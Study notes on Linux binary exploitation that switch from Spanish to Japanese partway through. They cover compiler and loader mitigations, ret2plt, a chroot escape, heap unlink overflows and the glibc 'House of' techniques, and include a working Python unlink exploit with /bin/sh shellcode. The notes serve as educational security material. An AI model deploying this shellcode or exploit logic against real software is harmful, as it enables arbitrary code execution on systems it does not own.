Bind now —> Las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura. **-z relro** y **-z now**

A pesar de esto, en general los programas no están complicados con esas opciones luego estos ataques siguen siendo posibles.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** —> Para saber si usan el BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 o =2**

Trata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la función por una función segura.

Por ej:\
char buf\[16];\
strcpy(but, source);

La identifica como insegura y entonces cambia strcpy() por \_\_strcpy\_chk() utilizando el tamaño del buffer como tamaño máximo a copiar.

La diferencia entre **=1** o **=2** es que:

La segunda no permite que **%n** venga de una sección con permisos de escritura. Además el parámetro para acceso directo de argumentos solo puede ser usado si se usan los anteriores, es decir, solo se pueda usar **%3$d** si antes se ha usado **%2$d** y **%1$d**

Para mostrar el mensaje de error se usa el argv\[0], por lo que si se pone en el la dirección de otro sitio (como una variable global) el mensaje de error mostrará el contenido de dicha variable. Pag 191

**Reemplazo de Libsafe**

Se activa con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
“/lib/libsave.so.2” > /etc/ld.so.preload

Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No está estandarizado. (solo para x86, no para compilaxiones con -fomit-frame-pointer, no compilaciones estaticas, no todas las funciones vulnerables se vuelven seguras y LD\_PRELOAD no sirve en binarios con suid).

**ASCII Armored Address Space**

Consiste en cargar las librería compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ningún ataque, y menos en little endian.

**ret2plt**

Consiste en realiza un ROP de forma que se llame a la función strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la función a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2ºbyte de system()… Al final se llama la dirección guardada en GOT que será system()

**Falso EBP**

Para las funciones que usen el EBP como registro para apuntar a los argumentos al modificar el EIP y apuntar a system() se debe haber modificado el EBP también para que apunte a una zona de memoria que tenga 2 bytes cuales quiera y después la dirección a &”/bin/sh”.

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user —> Instala un sistema básico bajo un subdirectorio específico

Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

**Instrumentación de código**

Valgrind —> Busca errores\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits básicos**

**Trozo asignado**

prev\_size |\
size | —Cabecera\
\*mem | Datos

**Trozo libre**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk —Cabecera\
\*mem | Datos

Los trozos libres están en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)

En “size” hay bits para indicar: Si el trozo anterior está en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.

Si al liberar un trozo alguno de los contiguos se encuentra libre , estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo más grande a frontlink() para que le inserte el bin adecuado.

unlink(){\
BK = P->bk; —> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD = P->fd; —> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD->bk = BK; —> El BK del siguiente chunk apunta al nuevo chunk\
BK->fd = FD; —> El FD del anterior chunk apunta al nuevo chunk\
}

Por lo tanto si conseguimos modificar el P->bk con la dirección de un shellcode y el P->fd con la dirección a una entrada en la GOT o DTORS menos 12 se logra:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Y así se se ejecuta al salir del programa la shellcode.

Además, la 4º sentencia de unlink() escribe algo y la shellcode tiene que estar reparada para esto:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> Esto provoca la escritura de 4 bytes a partir del 8º byte de la shellcode, por lo que la primera instrucción de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.

Por lo tanto el exploit se crea:

En el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.

Después de la shell code metemos relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev\_size para que tenga el bit que dice que está libre) y “-4“(0xfffffffc) en el size (para que cuando compruebe en el 3º trozo si el 2º estaba libre en realidad vaya al prev\_size modificado que le dirá que s´está libre) -> Así cuando free() investigue irá al size del 3º pero en realidad irá al 2º - 4 y pensará que el 2º trozo está libre. Y entonces llamará a **unlink()**.

Al llamar a unlink() usará como P->fd los primeros datos del 2º trozo por lo que ahí se meterá la dirección que se quieres sobreescribir - 12(pues en FD->bk le sumará 12 a la dirección guardada en FD) . Y en esa dirección introducirá la segunda dirección que encuentre en el 2º trozo, que nos interesará que sea la dirección a la shellcode(P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #前のチャンクが空きであることを示すビットが1になるようにする**

**fake\_size = pack("\<I”, 0xfffffffc) #-4、3番目のチャンクの「サイズ」が4バイト手前にあると思わせるため（2番目のチャンクが空きかどうかを確認する場所）**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #ペイロードの最初に8バイトのパディングを追加**

**got\_free = pack("\<I", 0x08048300 - 12) #plt内のfree()のアドレス-12（2回目のfree()呼び出し時にshellcodeが実行されるアドレスを上書きするアドレス）**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #ペイロードは、8バイトのパディングで始まることが指定されている**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2番目のチャンクを変更し、got\_freeはaddr\_sc + 12のアドレスを保存する場所を指す**

**os.system("./8.3.o " + payload)**

**unset()を逆順で解放する（wargame）**

3つの連続したチャンクを制御し、逆の順序で解放される。

その場合：

チャンクcにshellcodeを配置する

チャンクaを使用して、bを上書きして、サイズがPREV\_INUSEビットがオフになるようにし、チャンクaが空きだと思わせる

さらに、ヘッダbのサイズを-4に上書きする

その後、プログラムは「a」が空きでバイナリにあると思い、それをunlink()するために呼び出す。ただし、ヘッダPREV\_SIZEが-4であるため、「a」のチャンクが実際にはb+4から始まると考えます。つまり、b+4から始まるチャンクをunlink()し、b+12には「fd」ポインタがあり、b+16には「bk」ポインタがあります。

したがって、bkにshellcodeのアドレスを、fdに「puts()」のアドレス-12を配置すると、ペイロードが完成します。

**Frontlink技術**

何も連続するチャンクが解放されず、unlink()が呼び出されない場合、直接frontlink()が呼び出されます。

攻撃されるmallocが決して解放（free()）されない場合に有用な脆弱性。

必要なもの：

データ入力関数でオーバーフローする可能性のあるバッファ

このバッファの隣にある解放されるバッファで、前のバッファのオーバーフローによりそのヘッダのfdフィールドが変更される

512より大きく、前のバッファより小さいサイズの解放するバッファ

前述のステップ3より前に宣言されたバッファで、このバッファのprev\_sizeを上書きできる

これにより、制御されない2つのmallocを上書きし、1つだけが解放されるが、exploitを実行できます。

**ダブルfree()の脆弱性**

同じポインタで2回free()が呼び出されると、2つのbinが同じアドレスを指すようになります。

1つを再利用する場合は問題ありませんが、もう1つを使用しようとすると、前の予約が書き込むデータで「fd」と「bk」ポインタが誤った値になります。

**After free()**

以前解放されたポインタが制御なしに再度使用されます。

## **8 Heap Overflows: Exploits avanzados**

unlink()とfrontlink()の技術は、unlink()関数を変更することで削除されました。

**The house of mind**

コードの任意の実行を引き起こすには、1回のfree()呼び出しが必要です。前のバッファによってオーバーフローされ、解放される2番目のバッファを見つけることが重要です。

free()の呼び出しはpublic\_fREe(mem)を呼び出します。これは次のように機能します：

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> チャンクの開始アドレスを返します（mem-8）

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1\]では、サイズフィールドとNON\_MAIN\_ARENAビットを確認し、このチェックがtrueを返すように変更できます。その後、heap\_for\_ptr()が実行され、"mem"にAND演算が適用され、最下位の2.5バイトが0になります（0x0804a000の場合、0x08000000になります）。そして、0x08000000->ar\_ptr（struct heap\_infoとして扱われる）にアクセスします。

したがって、たとえば0x0804a000に制御可能なチャンクがある場合、0x081002a0に解放されるチャンクがある場合、0x08100000に到達し、たとえば0x0804a000を書き込むことができます。この2番目のチャンクが解放されると、heap\_for\_ptr(ptr)->ar\_ptrが0x08100000に書き込んだ内容を返します（0x081002a0にAND演算が適用され、最初の4バイトの値が取得されるため、ar\_ptrが取得されます）。

_int\_free(ar\_ptr, mem)が呼び出されるため、\_int\_free(0x0804a000, 0x081002a0)が実行されます。\
\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

前述のように、avの値を制御できるため、解放されるチャンクに書き込んだ値が使用されます。

unsorted\_chunksがどのように定義されているかを考えると、次のことがわかります：\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

したがって、av->bins\[2\]に\_\_DTOR\_END\_\_-12の値を書き込むと、最後の命令で\_\_DTOR\_END\_\_に2番目のチャンクのアドレスが書き込まれます。

つまり、最初のチャンクの先頭に\_\_DTOR\_END\_\_-12のアドレスを何度も配置する必要があります。av->bins\[2\]が取得するためです。

2番目のチャンクでは、最初に多くのnopsを配置し、最後にshellcodeを配置します。

これにより、\_int\_free(TROZO1, TROZO2)が呼び出され、\_\_DTOR\_END\_\_のアドレスがTROZO2のprev\_sizeのアドレスに書き込まれ、shellcodeにジャンプします。

この技術を適用するには、ペイロードを少し複雑にするいくつかの要件を満たす必要があります。
この技術はもはや適用されません。unlinkに適用されたパッチとほぼ同じパッチが適用されました。新しいサイトが自身に向けられているかどうかを比較します。

**Fastbin**

The house of mindの変種です。

次のコードを実行することに興味があります。これは、\_int\_free()関数の最初のチェックを通過した後に到達します。

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

したがって、"fb"にはGOT内の関数のアドレスがあり、このアドレスに上書きされるアドレスが配置されます。これには、アリーナがdtorsのアドレスに近い必要があります。具体的には、av->max\_fastが上書きされるアドレスにある必要があります。

The House of Mindでavの位置を制御できることがわかったため、sizeフィールドに8 + NON\_MAIN\_ARENA + PREV\_INUSEのサイズを設定すると、fastbin\_index()はfastbins\[-1]を返し、これはav->max\_fastを指します。

この場合、av->max\_fastは上書きされるアドレスになります（指すアドレスではなく、その位置が上書きされます）。

さらに、解放された隣接するチャンクのサイズが8より大きい必要があります。解放されたチャンクのサイズが8であると述べたため、この偽のチャンクには8より大きいサイズを設定するだけで十分です（さらに、シェルコードは解放されたチャンクに配置されるため、最初にnopsに落ちるjmpを配置する必要があります）。

さらに、同じ偽のチャンクはav->system\_memよりも小さくなければなりません。av->system\_memは1848バイト先にあります。

\_DTOR\_END\_のnullとGOT内のアドレスが少ないため、これらのセクションのどのアドレスも上書きに適していません。そのため、スタックを攻撃するためにfastbinを適用する方法を見てみましょう。

攻撃の別の方法は、**av**をスタックにリダイレクトすることです。

サイズを8ではなく16に変更すると、fastbin\_index()はfastbins\[0]を返し、これを使用してスタックを上書きできます。

これには、スタックにcanaryや奇妙な値が含まれていない必要があります。実際、このようになっている必要があります：4バイトのnull + EBP + RET

4バイトのnullが必要なのは、**av**がこのアドレスにある必要があり、**av**の最初の要素は0であるmutexである必要があるためです。

**av->max\_fast**はEBPになり、これは制約をスキップするための値になります。

**av->fastbins\[0]**には**p**のアドレスが上書きされ、RETになり、これによりシェルコードにジャンプします。

さらに、**av->system\_mem**（スタック上の位置から1484バイト上にある）には、スキップされる可能性のある多くのゴミが含まれており、これにより確認がスキップされます。

解放された隣接するチャンクのサイズが8より大きい必要があります。解放されたチャンクのサイズが16であると述べたため、この偽のチャンクには8より大きいサイズを設定するだけで十分です（さらに、シェルコードは解放されたチャンクに配置されるため、新しい偽のチャンクのサイズフィールドの後に配置されるnopsに落ちるjmpを配置する必要があります）。

**The House of Spirit**

この場合、攻撃者が変更可能なmallocへのポインタ（たとえば、オーバーフロー可能な変数の下のスタックにあるポインタ）を持つことを目指します。

したがって、このポインタを任意の場所に指すことができます。ただし、どの場所でも有効ではありません。偽のチャンクのサイズはav->max\_fastより小さく、より具体的には将来のmalloc()呼び出しで要求されるサイズ+8と同じである必要があります。したがって、たとえば、プログラムがユーザーに数値を尋ねる場合、48を入力し、malloc(40)の次の4バイトを指すポインタ（幸運な場合はEBPに属する可能性があります）を指すように変更できます。したがって、48が後ろに残るように、まるでサイズのヘッダーであるかのようにします。さらに、ptr-4+48のアドレスにはいくつかの条件を満たす必要があります（この場合、ptr=EBPであることを意味します）。つまり、8 < ptr-4+48 < av->system\_memである必要があります。

これが満たされると、次にmalloc(40)が呼び出されると、EBPのアドレスが割り当てられます。攻撃者がこのmallocで書き込むこともできる場合、EBPとEIPの両方を任意のアドレスで上書きできます。

これは、free()がスタックのEBPを指すアドレスに、新しいmalloc()で予約する必要のある完璧なサイズのチャンクがあることを覚えているためだと思われます。

**The House of Force**

必要なもの：

* wildernessを上書きできるオーバーフロー
* ユーザーが定義したサイズでのmalloc()呼び出し
* ユーザーが定義したデータでのmalloc()呼び出し

最初に行うことは、wildernessのサイズを非常に大きな値（0xffffffff）で上書きすることです。これにより、十分に大きなメモリ要求があれば、ヒープを拡張する必要なく_int_malloc()で処理されます。

次に、av->topを、スタックなどの攻撃者の制御下にあるメモリ領域を指すように変更します。av->topには\&EIP - 8が配置されます。

av->topを攻撃者の制御下のメモリ領域を指すように上書きする必要があります：

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victimは現在のwildernessチャンクのアドレスを収集し、remainderはそのアドレスにmalloc()によって要求されたバイト数を追加したものです。したがって、\&EIP-8が0xbffff224にあり、av->topが0x080c2788を含む場合、次のmalloc()でav->topが$EIP-8を指すようにするために制御されたmallocで予約する必要のあるバイト数は次のようになります：

0xbffff224 - 0x080c2788 = 3086207644.

これにより、av->topに変更された値が保存され、次のmallocがEIPを指し、上書きできるようになります。

新しいwildernessチャンクのサイズが、最後のmalloc()によって要求されたサイズよりも大きい必要があることを知っておくことが重要です。つまり、wildernessが\&EIP-8を指している場合、サイズはちょうどスタックのEBPフィールドになります。

**The House of Lore**

**SmallBinの破損**

解放されたチャンクはサイズに応じてbinに挿入されます。しかし、挿入される前にunsorted binsに保存されます。チャンクが解放されると、すぐに適切なbinに挿入されるのではなく、unsorted binsに残ります。次に、新しいチャンクが予約され、前の解放されたチャンクが役立つ場合はそれが返されますが、より大きなチャンクが予約されると、unsorted bins内の解放されたチャンクは適切なbinに挿入されます。

脆弱なコードに到達するには、メモリ要求がav->max\_fast（通常72）より大きく、MIN\_LARGE\_SIZE（512）より小さい必要があります。

binに適切なサイズのチャンクがある場合、それを解除してから返します：

bck = victim->bk; 前のチャンクを指します。これを変更できる唯一の情報です。

bin->bk = bck; 2番目のチャンクが最後のチャンクになり、bckがスタックを指す場合、次に予約されるチャンクにはこのアドレスが与えられます。

bck->fd = bin; リストを閉じ、これをbinに指します。

必要なもの：
**基本的なESPの悪用**

1. 2つのmallocを予約し、2番目のmallocが解放され、そのbinに入れられた後に最初のmallocにオーバーフローできるようにします（つまり、オーバーフローする前に2番目のチャンクよりも大きなmallocが予約されます）。
2. 攻撃者が選択したアドレスを持つmalloc予約されたチャンクを攻撃者が制御できるようにします。
3. 攻撃の目的は、解放されたbinの下にあるヒープにオーバーフローを行うことができれば、そのポインタbkを変更できます。ポインタbkを変更し、このチャンクがbinのリストの最初になり、予約されると、binは欺かれ、次に提供されるリストの最後のチャンクが攻撃者が設定した偽のアドレス（たとえば、スタックまたはGOT）にあると信じ込まされます。したがって、別のチャンクが再度予約され、攻撃者がそのチャンクに権限を持っている場合、望ましい位置にチャンクが与えられ、その位置に書き込むことができます。
4. 変更されたチャンクを解放した後、解放されたチャンクよりも大きなチャンクを予約する必要があります。これにより、変更されたチャンクはunsorted binsから出て、そのbinに挿入されます。
5. binに入った後は、オーバーフローを使用してポインタbkを変更し、binがmalloc()が十分に呼び出されるのを待つ必要があります。これにより、変更されたbinが再度使用され、binを欺いて次のチャンクが偽のアドレスにあると信じ込ませることができます。そして、望ましいチャンクが与えられます。

**LargeBinの破損**

1. 前述の要件に加えて、予約されたチャンクは512よりも大きくする必要があります。
2. 攻撃は前述のものと同じですが、変更されたチャンクのサイズを変更する必要があります。つまり、そのサイズ - nbがMINSIZEよりも小さくなるようにする必要があります。
3. たとえば、サイズを1552に設定して、1552 - 1544 = 8 < MINSIZEとなるようにします（負にならないようにするため、unsignedで比較されます）。
4. さらに、より複雑にするためのパッチが導入されています。

**ヒープスプレー**

- ヒープを可能な限り予約し、これらをnopsのパディングで埋め、最後にシェルコードで終了させることを基本とします。パディングとして0x0cを使用します。つまり、アドレス0x0c0c0c0cにジャンプしようとします。したがって、このパディングで呼び出されるアドレスが上書きされる場合、そこにジャンプします。基本的には、ポインタが上書きされる可能性があるかどうかを確認するために、可能な限り予約し、0x0c0c0c0cにジャンプし、そこにnopsがあることを期待します。

**ヒープ風水**

- 予約と解放を繰り返すことで、空いているチャンクの間に予約されたチャンクが残るようにメモリをセメントすることで、ヒープを整えることです。オーバーフローするバッファはそのうちの1つに配置されます。
